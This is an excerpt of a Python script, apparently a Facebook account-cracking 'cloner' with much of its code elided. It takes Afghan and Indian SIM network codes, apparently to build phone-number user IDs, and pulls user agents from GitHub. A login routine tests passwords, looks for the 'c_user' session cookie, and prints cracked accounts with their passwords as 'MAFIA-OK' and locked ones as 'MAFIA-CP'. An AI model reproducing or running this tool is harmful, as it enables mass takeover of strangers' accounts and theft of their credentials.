#created by irtaza hasaan
#torttaly written by irtaza Hassan
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Irtazaha/User.Agents/blob/main/User-Agent.txt').text
...
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m6.6
...
def pass1():
    ...
    print('\033[1;97m====================================================') 
    print(f'\033[1;97m[!] \033[1;92mAFG SIM CODES  \033[1;91m: \033[1;96m9378, 9377, 9379, 9370')
...
def pass2():
    ...
    print(f'\033[1;97m[!] \033[1;92mIND SIM CODES \033[1;91m: \033[1;96m91930, 91778, 91712 , 91902  ')
    print('\033[1;97m====================================================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR AFG [9370 / 9379 / 9378 / 9377 /9372]\033[0;m")
    print('\033[1;97m====================================================') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m PUT SIM NETWORK CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)
...
def pass3():
    ...
    print(f"  \x1b[97m\033[37;41m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    print(f"\t        \x1b[97m\033[37;41m[ EXAMPLE👇]\9370[0;m")
    print('\033[1;97m====================================================') 
...
def freeq(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[MAFIA-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91m[MAFIA-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[MAFIA] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
